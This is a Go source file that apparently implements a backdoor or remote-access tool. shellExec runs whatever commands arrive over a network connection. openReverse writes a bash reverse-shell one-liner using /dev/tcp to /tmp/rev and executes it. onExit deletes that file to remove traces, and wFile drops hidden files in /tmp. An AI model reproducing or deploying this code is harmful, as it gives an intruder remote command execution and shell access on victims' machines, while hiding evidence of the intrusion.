package main

import (
	"bufio"
	"fmt"
	"io/ioutil"
	"net"
	"os"
	"os/exec"
	"regexp"
	"runtime"
	"strings"
)

func checkOS() string {
	return "Running on " + runtime.GOOS + "\n"
}

func shellExec(conn net.Conn) string {
	buffer, err := bufio.NewReader(conn).ReadBytes('\n')

	if err != nil {
		conn.Close()
		return "Connection closed.\n"
	}

	var cmd *exec.Cmd

	if string(buffer[0]) == "W" {
		buffer = buffer[1 : len(buffer)-1]
	}

	instr := strings.Split(string(buffer), " ")

	if len(instr) > 1 {
		args := instr[1:]
		cmd = exec.Command(instr[0], args...)
	} else {
		cmd = exec.Command(string(buffer[:len(buffer)-1]))
	}

	stdout, err := cmd.Output()

	if err != nil {
		return err.Error() + "\n"
	}

	return string(stdout)
}

func openReverse() string {
	if !fileExists("/tmp/rev") {
		d1 := []byte("bash -i >& /dev/tcp/127.0.0.1/5555 0>&1\n")
		err := ioutil.WriteFile("/tmp/rev", d1, 0644)
		if err != nil {
			return "Failed to write file.\n"
		}
	}

	cmd := exec.Command("bash", "/tmp/rev")

	stdout, err := cmd.Output()

	if err != nil {
		return "netcat up? - " + err.Error() + "\n"
	}

	return string(stdout) + "\n"

}

func fileExists(filename string) bool {
	info, err := os.Stat(filename)
	if os.IsNotExist(err) {
		return false
	}
	return !info.IsDir()
}

func onExit(conn net.Conn) string {
	if !fileExists("/tmp/rev") {
		return "Connection closed....\n"
	}
	cmd := exec.Command("rm", "-r", "/tmp/rev")

	_, err := cmd.Output()

	if err != nil {
		return err.Error() + "\n"
	}

	return "Deleted files and Connection closed.\n"
}

func wFile(info []byte) string {
	fmt.Println("info: " + string(info))
	fmt.Println(info)
	titlePattern := regexp.MustCompile(`.000`)
	bodyPattern := regexp.MustCompile(`==.`)

	var infoS []string

	infoS = titlePattern.Split(string(info), -1)
	infoS = bodyPattern.Split(strings.Join(infoS, ""), -1)

	title := infoS[0]
	body := infoS[1]

	if !fileExists("/tmp/." + title) {
		err := ioutil.WriteFile("/tmp/."+title, []byte(body), 0664)

		if err != nil {
			return "Connection closed - Error writing.\n"
		}
	}

	return "File created!\n"
}
